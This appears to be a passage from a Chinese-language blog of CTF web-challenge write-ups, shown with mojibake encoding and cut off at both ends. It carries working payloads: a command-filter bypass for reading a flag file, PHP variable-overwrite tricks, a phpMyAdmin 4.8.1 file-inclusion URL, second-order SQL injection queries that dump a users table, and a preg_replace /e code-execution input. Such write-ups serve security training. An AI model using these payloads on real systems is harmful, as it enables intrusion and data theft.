class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%0</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span>b<span class="symbol">%0</span>FI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%FEW</span><span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%96</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span><span class="symbol">%E5Z</span><span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>E<span class="symbol">%D6</span><span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span></span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡ï¼Œ<code>string</code>å¼ºåˆ¶ç±»å‹è½¬æ¢åéƒ½æ˜¯ â€œArrayâ€</p>
<p>å‘½ä»¤ç¦ç”¨äº†å¾ˆå¤šï¼Œä½†<strong>linuxå‘½ä»¤ä¸­å¯ä»¥åŠ \ï¼Œæ‰€ä»¥ç”šè‡³å¯ä»¥ca\t /fl\ag</strong></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810172023014.png" alt="image-20200810172023014"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810172043258.png" alt="image-20200810172043258"></p>
<p>å…¶ä»–æ€è·¯1ï¼š</p>
<p>sortå‘½ä»¤ï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚</p>
<p>å…¶ä»–æ€è·¯2ï¼š</p>
<p>æŠŠflagç§»åˆ°webç›®å½•ä¸‹ï¼Œç„¶åç›´æ¥è®¿é—®æ‹¿åˆ°flag</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810172253738.png" alt="image-20200810172253738"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810172317785.png" alt="image-20200810172317785"></p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>.gitæ³„éœ²ï¼Œgithackæ‹¿æºç </p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;	<span class="comment">//GETæ–¹å¼ä¼ flag,ä¸”flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;	<span class="comment">//GETå’ŒPOSTå…¶ä¸­ä¹‹ä¸€å¿…é¡»ä¼ flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;	<span class="comment">//GETå’ŒPOSTä¼ flag,ä¸èƒ½æ˜¯flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨å˜é‡è¦†ç›–</p>
<p>payload1: <code>yds=flag</code></p>
<p><code>$$x = $$y</code>  =&gt; <code>$(yds) = $(flag)</code> =&gt; <code>$yds=flag{xxxx}</code> =&gt; <code>exit($yds)</code></p>
<p>payload2:<code>is=flag&amp;flag=flag</code></p>
<p><code>$$x = $$y</code> =&gt; <code>$(is)=$(flag)</code> =&gt; <code>$is=flag{xxxx}</code></p>
<p><code>$$xx = $$y</code> =&gt; <code>$(flag)=$(flag)</code> =&gt; <code>$flag=flag{xxxx}</code></p>
<p><code>exit($is)</code></p>
<h3 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h3><p>æ‰«æåˆ°phpinfo.phpå’Œphpmyadmin 4.8.1</p>
<p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a> </p>
<p>æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒåŠ ä¸Šphpinfo.phpä¸Šä¼ ä¸´æ—¶æ–‡ä»¶getshell (:</p>
<p>æƒ³å¤æ‚äº†ï¼Œç›´æ¥åŒ…å«/flagå°±è¡Œ</p>
<p>payload:<code>http://e5abf389-9025-4a73-a415-3e10dc57dc21.node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../..//flag</code></p>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>åœ¨<a href="https://www.compart.com/en/unicode/æœç´¢" target="_blank" rel="noopener">https://www.compart.com/en/unicode/æœç´¢</a> <strong>thousand</strong>æ‰¾å¤§äº1337çš„å­—ç¬¦</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810230209866.png" alt="image-20200810230209866"></p>
<p>æäº¤ <code>%E1%8D%BC</code>å³å¯å¾—åˆ°flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>æŒ‰ç…§æç¤ºåŠ å…¥header</p>
<p>1.Client-IP</p>
<p>2.X-Forwarded-For</p>
<p>3.Remote_Addr</p>
<p>å‡å¯ä»¥ä¿®æ”¹IP</p>
<p>phpä¸‹çš„æ¨¡æ¿æ³¨å…¥</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810232530556.png" alt="image-20200810232530556"></p>
<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>ç™»å½•äº†ä¹‹ååœ¨å‘å¸ƒå¹¿å‘Šå¤„å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹åœ¨è¾“å…¥åæ²¡æœ‰æ¼æ´ï¼Œå½“æˆ‘ä»¬å‘å¸ƒå¹¿å‘ŠåæŸ¥çœ‹å¹¿å‘Šè¯¦æƒ…çš„æ—¶å€™å°±é€ æˆäº†äºŒæ¬¡æ³¨å…¥ï¼Œä»è€Œäº§ç”Ÿäº†æ³¨å…¥ã€‚</p>
<p>é¢˜ç›®ç¯å¢ƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬ä½¿ç”¨/**/æ¥è¿›è¡Œç»•è¿‡è¿‡æ»¤äº†orï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨order by ä»¥åŠinformation_schemaè¿™ä¸ªåº“å› ä¸ºè¿‡æ»¤äº†æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥çš„æœ€åæˆ‘ä»¬è¦é—­åˆå•å¼•å·</p>
<p>æ— åˆ—åæ³¨å…¥</p>
<p><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/â€™</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å°†usersè¿™ä¸ªè¡¨é‡Œé¢çš„æŸ¥è¯¢çš„ç»“æœæä¾›ç»™å¤–éƒ¨æŸ¥è¯¢ï¼ŒåŒæ—¶æŠŠåˆ—åè½¬æ¢æˆa,bï¼Œè¿™æ ·æˆ‘ä»¬åé¢å°±ç›´æ¥æŸ¥è¯¢a,båˆ—å°±å¯ä»¥è·å¾—ç»“æœ</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200812174257429.png" alt="image-20200812174257429"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">true@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>preg_replace()ä½¿ç”¨çš„/eæ¨¡å¼å¯ä»¥å­˜åœ¨<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">è¿œç¨‹æ‰§è¡Œä»£ç </a></p>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?.*=&#123;<span class="variable">$&#123;phpinfo()&#125;</span>&#125;</span><br><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200812174555693.png" alt="image-20200812174555693"></p>
<h3 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p>ç¡®å®ç¬¬ä¸€</p>
<p>æŠ“åŒ…å‘ç° L0g1n.php</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200812181110056.png" alt="image-20200812181110056"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200812181236407.png" alt="image-20200812181236407"></p>
<p>å„ç§headeré›†åˆ</p>
<table>
<thead>
<tr>
<th>Header</th>
<th>è§£é‡Š</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>æŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿæ¥æ”¶çš„å†…å®¹ç±»å‹</td>
<td>Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>æµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç é›†ã€‚</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>æŒ‡å®šæµè§ˆå™¨å¯ä»¥æ”¯æŒçš„webæœåŠ¡å™¨è¿”å›å†…å®¹å‹ç¼©ç¼–ç ç±»å‹ã€‚</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>æµè§ˆå™¨å¯æ¥å—çš„è¯­è¨€</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>å¯ä»¥è¯·æ±‚ç½‘é¡µå®ä½“çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­èŒƒå›´å­—æ®µ</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTPæˆæƒçš„æˆæƒè¯ä¹¦</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>æŒ‡å®šè¯·æ±‚å’Œå“åº”éµå¾ªçš„ç¼“å­˜æœºåˆ¶</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>è¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿æ¥ã€‚ï¼ˆHTTP 1.1é»˜è®¤è¿›è¡ŒæŒä¹…è¿æ¥ï¼‰</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTPè¯·æ±‚å‘é€æ—¶ï¼Œä¼šæŠŠä¿å­˜åœ¨è¯¥è¯·æ±‚åŸŸåä¸‹çš„æ‰€æœ‰cookieå€¼ä¸€èµ·å‘é€ç»™webæœåŠ¡å™¨ã€‚</td>
<td>Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>è¯·æ±‚çš„å†…å®¹é•¿åº¦</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>è¯·æ±‚çš„ä¸å®ä½“å¯¹åº”çš„MIMEä¿¡æ¯</td>
<td>Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>è¯·æ±‚å‘é€çš„æ—¥æœŸå’Œæ—¶é—´</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>è¯·æ±‚çš„ç‰¹å®šçš„æœåŠ¡å™¨è¡Œä¸º</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·çš„Email</td>
<td>From: <a href="mailto:user@email.com" target="_blank" rel="noopener">user@email.com</a></td>
</tr>
<tr>
<td>Host</td>
<td>æŒ‡å®šè¯·æ±‚çš„æœåŠ¡å™¨çš„åŸŸåå’Œç«¯å£å·</td>
<td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td>
</tr>
<tr>
<td>If-Match</td>
<td>åªæœ‰è¯·æ±‚å†…å®¹ä¸å®ä½“ç›¸åŒ¹é…æ‰æœ‰æ•ˆ</td>
<td>If-Match: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>å¦‚æœè¯·æ±‚çš„éƒ¨åˆ†åœ¨æŒ‡å®šæ—¶é—´ä¹‹åè¢«ä¿®æ”¹åˆ™è¯·æ±‚æˆåŠŸï¼Œæœªè¢«ä¿®æ”¹åˆ™è¿”å›304ä»£ç </td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>å¦‚æœå†…å®¹æœªæ”¹å˜è¿”å›304ä»£ç ï¼Œå‚æ•°ä¸ºæœåŠ¡å™¨å…ˆå‰å‘é€çš„Etagï¼Œä¸æœåŠ¡å™¨å›åº”çš„Etagæ¯”è¾ƒåˆ¤æ–­æ˜¯å¦æ”¹å˜</td>
<td>If-None-Match: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Range</td>
<td>å¦‚æœå®ä½“æœªæ”¹å˜ï¼ŒæœåŠ¡å™¨å‘é€å®¢æˆ·ç«¯ä¸¢å¤±çš„éƒ¨åˆ†ï¼Œå¦åˆ™å‘é€æ•´ä¸ªå®ä½“ã€‚å‚æ•°ä¹Ÿä¸ºEtag</td>
<td>If-Range: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>åªåœ¨å®ä½“åœ¨æŒ‡å®šæ—¶é—´ä¹‹åæœªè¢«ä¿®æ”¹æ‰è¯·æ±‚æˆåŠŸ</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>é™åˆ¶ä¿¡æ¯é€šè¿‡ä»£ç†å’Œç½‘å…³ä¼ é€çš„æ—¶é—´</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>ç”¨æ¥åŒ…å«å®ç°ç‰¹å®šçš„æŒ‡ä»¤</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>è¿æ¥åˆ°ä»£ç†çš„æˆæƒè¯ä¹¦</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Range</td>
<td>åªè¯·æ±‚å®ä½“çš„ä¸€éƒ¨åˆ†ï¼ŒæŒ‡å®šèŒƒå›´</td>
<td>Range: bytes=500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>å…ˆå‰ç½‘é¡µçš„åœ°å€ï¼Œå½“å‰è¯·æ±‚ç½‘é¡µç´§éšå…¶å,å³æ¥è·¯</td>
<td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archivesâ€¦</a></td>
</tr>
<tr>
<td>TE</td>
<td>å®¢æˆ·ç«¯æ„¿æ„æ¥å—çš„ä¼ è¾“ç¼–ç ï¼Œå¹¶é€šçŸ¥æœåŠ¡å™¨æ¥å—æ¥å—å°¾åŠ å¤´ä¿¡æ¯</td>
<td>TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>å‘æœåŠ¡å™¨æŒ‡å®šæŸç§ä¼ è¾“åè®®ä»¥ä¾¿æœåŠ¡å™¨è¿›è¡Œè½¬æ¢ï¼ˆå¦‚æœæ”¯æŒï¼‰</td>
<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agentçš„å†…å®¹åŒ…å«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¿¡æ¯</td>
<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>é€šçŸ¥ä¸­é—´ç½‘å…³æˆ–ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œé€šä¿¡åè®®</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>å…³äºæ¶ˆæ¯å®ä½“çš„è­¦å‘Šä¿¡æ¯</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody></table>
<h3 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span 